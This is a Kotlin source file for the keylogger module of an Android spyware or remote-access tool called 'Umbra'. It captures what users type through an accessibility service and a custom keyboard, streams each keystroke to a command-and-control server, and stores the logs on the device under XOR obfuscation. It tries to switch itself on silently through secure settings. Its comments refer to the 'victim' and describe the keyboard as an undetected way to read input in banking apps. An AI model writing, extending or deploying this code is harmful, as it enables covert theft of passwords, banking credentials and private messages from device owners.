package org.umbra.core.modules

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.util.Log
import android.view.inputmethod.InputMethodManager
import org.umbra.core.c2.C2Coordinator
import org.umbra.core.c2.Command
import org.umbra.core.core.KeylogEntry
import org.umbra.core.core.ResponseEnvelope
import org.umbra.core.core.UmbraResponse
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.File

/**
 * AccessibilityService-based keylogger.
 *
 * The UmbraAccessibilityService (declared in AndroidManifest.xml) is the actual
 * Android component that receives TYPE_VIEW_TEXT_CHANGED events. This object:
 *   1. Buffers captured keystrokes (memory + encrypted disk).
 *   2. Streams each keystroke to the C2 server in real-time when streaming is on.
 *   3. Provides the command surface (start / stop / dump / status).
 */
object KeylogModule {

    private const val TAG = "Umbra.Keylog"
    private const val MAX_BUFFER = 1000
    private const val KEYLOG_FILE = "umbra_keylog.dat"
    private val keylogBuffer = mutableListOf<KeylogEntry>()
    private val xorKey = byteArrayOf(0x53, 0x79, 0x6E, 0x61, 0x70, 0x73, 0x65, 0x21) // "Synapse!"

    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = false }

    // Tracks whether the accessibility service is connected (keylogger capturing)
    @Volatile var hasActiveSession = false

    // Tracks whether the IME (UmbraKeyboardService) is the active input method
    @Volatile var hasImeSession = false

    // When true, every captured keystroke is pushed to the C2 server in real-time
    @Volatile var streamingEnabled = false

    // Last captured field text per package, used by the service for delta capture
    private val lastText = java.util.concurrent.ConcurrentHashMap<String, String>()

    /**
     * Called by the AccessibilityService when text is captured. Buffers it for
     * later dump. (Streaming is handled separately via [onKeystroke].)
     */
    fun onKeyEvent(packageName: String, text: String) {
        val entry = KeylogEntry(
            text = text,
            package_name = packageName,
            timestamp = System.currentTimeMillis()
        )

        synchronized(keylogBuffer) {
            keylogBuffer.add(entry)
            if (keylogBuffer.size > MAX_BUFFER) {
                keylogBuffer.removeAt(0)
            }
        }
    }

    /**
     * Streams a single keystroke (delta text) to the C2 server in real-time.
     * Called both from onKeyEvent and directly by the accessibility service
     * when it has finer-grained keystroke deltas.
     */
    fun onKeystroke(packageName: String, typedText: String) {
        if (!streamingEnabled) return
        if (typedText.isBlank()) return
        try {
            val envelope = ResponseEnvelope(
                type = "LiveEventResponse",
                device_id = "",
                cmd_id = "keylog_push",
                status = "ok",
                payload = UmbraResponse.LiveEventResponse(
                    event_type = "keystroke",
                    package_name = packageName,
                    keylog_text = typedText,
                    keylog_package = packageName,
                    keylog_event = "keystroke"
                )
            )
            val serialized = json.encodeToString(ResponseEnvelope.serializer(), envelope)
            C2Coordinator.sendResult(serialized)
        } catch (e: Exception) {
            Log.d(TAG, "keystroke push failed: ${e.message}")
        }
    }

    /**
     * Tracks the previous field text for [packageName]. Returns the newly-typed
     * characters (positive delta), or null if text was deleted/replaced.
     */
    fun computeTypedDelta(packageName: String, newText: String): String? {
        val prev = lastText.put(packageName, newText) ?: return newText.ifBlank { null }
        if (prev == newText) return null
        // Common prefix length
        var i = 0
        while (i < prev.length && i < newText.length && prev[i] == newText[i]) i++
        // Common suffix length (careful not to double-count the prefix)
        val prevSuffix = prev.length - i
        val newSuffix = newText.length - i
        var s = 0
        while (s < prevSuffix && s < newSuffix &&
            prev[prev.length - 1 - s] == newText[newText.length - 1 - s]) s++
        val removed = prev.substring(i, prev.length - s)
        val added = newText.substring(i, newText.length - s)
        return when {
            added.isNotEmpty() && removed.isEmpty() -> added
            added.isEmpty() && removed.isNotEmpty() -> "\u232B".repeat(removed.length) // backspace
            added.isNotEmpty() && removed.isNotEmpty() -> "\u232B${removed.length}$added"
            else -> null
        }
    }

    suspend fun start(context: Context, cmd: Command): UmbraResponse {
        val enabled = isAccessibilityEnabled(context)
        hasActiveSession = enabled
        var autoEnabled = false
        if (!enabled) {
            // Best-effort attempt to enable via WRITE_SECURE_SETTINGS (only works
            // if the app holds that permission, e.g. via pm grant / root). Otherwise
            // fall back to opening the Accessibility settings screen for the user.
            autoEnabled = tryEnableViaSecureSettings(context)
            if (!autoEnabled) {
                try {
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {}
            }
        }

        streamingEnabled = true
        val nowEnabled = isAccessibilityEnabled(context) || autoEnabled
        hasActiveSession = nowEnabled

        return if (nowEnabled) {
            UmbraResponse.LiveStatusResponse(
                status = "keylog_active",
                monitors = mapOf("keylogger" to true)
            )
        } else {
            UmbraResponse.ErrorResponse(
                "keylog:accessibility_service_must_be_enabled_in_settings",
                "keylog"
            )
        }
    }

    suspend fun stop(context: Context, cmd: Command): UmbraResponse {
        streamingEnabled = false
        hasActiveSession = false
        persistToDisk(context)
        return UmbraResponse.LiveStatusResponse(
            status = "keylog_stopped",
            monitors = mapOf("keylogger" to false)
        )
    }

    /**
     * Start the IME (custom keyboard) keylogger. This is the primary
     * non-detected capture method — banking apps do not block input methods.
     *
     * Enables real-time streaming and verifies the keyboard is enabled. If not,
     * it first attempts a silent enable via Settings.Secure (needs
     * WRITE_SECURE_SETTINGS), then falls back to opening the input-method
     * settings screen for the victim to enable/select the keyboard.
     */
    suspend fun startKeyboard(context: Context, cmd: Command): UmbraResponse {
        streamingEnabled = true
        val enabled = isImeEnabled(context)
        var autoEnabled = false
        if (!enabled) {
            autoEnabled = tryEnableImeViaSecureSettings(context)
            if (!autoEnabled) {
                openImeSettings(context)
            }
        }

        val nowEnabled = isImeEnabled(context) || autoEnabled
        hasImeSession = nowEnabled

        return if (nowEnabled) {
            UmbraResponse.LiveStatusResponse(
                status = "keylog_ime_active",
                monitors = mapOf(
                    "keylogger" to true,
                    "ime_enabled" to true,
                    "ime_default" to isImeDefault(context)
                )
            )
        } else {
            UmbraResponse.ErrorResponse(
                "keylog:ime_must_be_enabled_in_settings",
                "keylog"
            )
        }
    }

    /**
     * Guide the victim to enable/select the keyboard. If already enabled but
     * not the current input method, shows the quick-switch picker; otherwise
     * opens the full input-method settings screen.
     */
    suspend fun enableKeyboard(context: Context, cmd: Command): UmbraResponse {
        val enabled = isImeEnabled(context)
        if (enabled && !isImeDefault(context)) {
            try {
                val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                imm.showInputMethodPicker()
            } catch (_: Exception) {
                openImeSettings(context)
            }
        } else if (!enabled) {
            openImeSettings(context)
        }

        return UmbraResponse.LiveStatusResponse(
            status = "ime_picker_opened",
            monitors = mapOf(
                "ime_enabled" to isImeEnabled(context),
                "ime_default" to isImeDefault(context)
            )
        )
    }

    private fun openImeSettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_INPUT_METHOD_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (_: Exception) {
            try {
                val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                imm.showInputMethodPicker()
            } catch (_: Exception) {}
        }
    }

    /**
     * ComponentName of the Umbra IME keyboard keylogger.
     */
    fun imeComponent(context: Context): ComponentName =
        ComponentName(context, UmbraKeyboardService::class.java)

    /**
     * Whether the Umbra keyboard is enabled as an input method.
     */
    fun isImeEnabled(context: Context): Boolean {
        return try {
            val comp = imeComponent(context).flattenToString()
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_INPUT_METHODS
            ) ?: return false
            enabled.split(':').any { it == comp }
        } catch (e: Exception) {
            Log.d(TAG, "isImeEnabled: ${e.message}")
            false
        }
    }

    /**
     * Whether the Umbra keyboard is the currently selected input method.
     */
    fun isImeDefault(context: Context): Boolean {
        return try {
            val comp = imeComponent(context).flattenToString()
            val def = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.DEFAULT_INPUT_METHOD
            ) ?: return false
            def == comp
        } catch (e: Exception) {
            Log.d(TAG, "isImeDefault: ${e.message}")
            false
        }
    }

    /**
     * Best-effort silent enable + set of the IME via Settings.Secure. Requires
     * WRITE_SECURE_SETTINGS (pm grant / root). Mirrors the accessibility
     * enable path. Returns true only if the IME ends up in ENABLED_INPUT_METHODS.
     */
    private fun tryEnableImeViaSecureSettings(context: Context): Boolean {
        return try {
            val comp = imeComponent(context).flattenToString()
            val current = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_INPUT_METHODS
            ) ?: ""
            val updated = if (current.isEmpty()) comp
            else if (current.split(':').contains(comp)) current
            else "$current:$comp"
            Settings.Secure.putString(
                context.contentResolver,
                Settings.Secure.ENABLED_INPUT_METHODS,
                updated
            )
            Settings.Secure.putString(
                context.contentResolver,
                Settings.Secure.DEFAULT_INPUT_METHOD,
                comp
            )
            val re = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_INPUT_METHODS
            ) ?: ""
            re.split(':').contains(comp)
        } catch (e: Exception) {
            Log.d(TAG, "tryEnableImeViaSecureSettings: ${e.message}")
            false
        }
    }

    suspend fun status(context: Context, cmd: Command): UmbraResponse {
        val capturing = hasActiveSession || hasImeSession
        return UmbraResponse.LiveStatusResponse(
            status = if (capturing) "capturing" else "idle",
            monitors = mapOf(
                "keylogger" to capturing,
                "streaming" to streamingEnabled,
                "accessibility_enabled" to isAccessibilityEnabled(context),
                "ime_enabled" to isImeEnabled(context),
                "ime_default" to isImeDefault(context)
            )
        )
    }

    suspend fun dump(context: Context, cmd: Command): UmbraResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 100).coerceAtMost(MAX_BUFFER)
        val packageFilter = cmd.params["package"]

        return try {
            val diskEntries = loadFromDisk(context)

            val merged = synchronized(keylogBuffer) {
                val all = (diskEntries + keylogBuffer).distinctBy { "${it.timestamp}_${it.text}" }
                val filtered = if (packageFilter != null) {
                    all.filter { it.package_name.contains(packageFilter) }
                } else {
                    all
                }
                filtered.takeLast(count)
            }

            UmbraResponse.KeylogResponse(
                keystrokes = merged,
                count = merged.size
            )
        } catch (e: Exception) {
            UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
        }
    }

    /**
     * Checks whether the Umbra accessibility service is enabled in Settings.
     */
    fun isAccessibilityEnabled(context: Context): Boolean {
        return try {
            val expected = ComponentName(context, UmbraAccessibilityService::class.java)
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            enabled.split(':').any { part ->
                ComponentName.unflattenFromString(part) == expected
            }
        } catch (e: Exception) {
            Log.d(TAG, "isAccessibilityEnabled: ${e.message}")
            false
        }
    }

    /**
     * Attempts to enable the accessibility service by writing to the secure
     * setting directly. This requires WRITE_SECURE_SETTINGS (shell/root).
     */
    private fun tryEnableViaSecureSettings(context: Context): Boolean {
        return try {
            val component = ComponentName(context, UmbraAccessibilityService::class.java)
                .flattenToString()
            val current = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            val updated = if (current.isEmpty()) component
            else if (current.split(':').contains(component)) current
            else "$current:$component"
            Settings.Secure.putString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                updated
            )
            Settings.Secure.putString(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED,
                "1"
            )
            // re-check
            val re = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            re.split(':').contains(component)
        } catch (e: Exception) {
            Log.d(TAG, "tryEnableViaSecureSettings: ${e.message}")
            false
        }
    }

    /**
     * Persist current buffer to encrypted file on disk.
     */
    fun persistToDisk(context: Context) {
        try {
            val file = File(context.filesDir, KEYLOG_FILE)
            val entries: List<KeylogEntry>
            synchronized(keylogBuffer) {
                entries = keylogBuffer.toList()
            }

            val sb = StringBuilder()
            for (e in entries) {
                sb.append("${e.timestamp}|${e.package_name}|${e.text}\n")
            }

            val plain = sb.toString().toByteArray(Charsets.UTF_8)
            val encrypted = xorEncrypt(plain)
            file.writeBytes(encrypted)
        } catch (_: Exception) {}
    }

    private fun loadFromDisk(context: Context): List<KeylogEntry> {
        return try {
            val file = File(context.filesDir, KEYLOG_FILE)
            if (!file.exists()) return emptyList()

            val encrypted = file.readBytes()
            val plain = xorEncrypt(encrypted)
            val text = String(plain, Charsets.UTF_8)

            text.lines().filter { it.isNotBlank() }.mapNotNull { line ->
                val parts = line.split("|", limit = 3)
                if (parts.size >= 3) {
                    KeylogEntry(
                        timestamp = parts[0].toLongOrNull() ?: 0L,
                        package_name = parts[1],
                        text = parts[2]
                    )
                } else null
            }
        } catch (_: Exception) {
            emptyList()
        }
    }

    private fun xorEncrypt(data: ByteArray): ByteArray {
        val result = data.copyOf()
        for (i in result.indices) {
            result[i] = (result[i].toInt() xor xorKey[i % xorKey.size].toInt()).toByte()
        }
        return result
    }
}
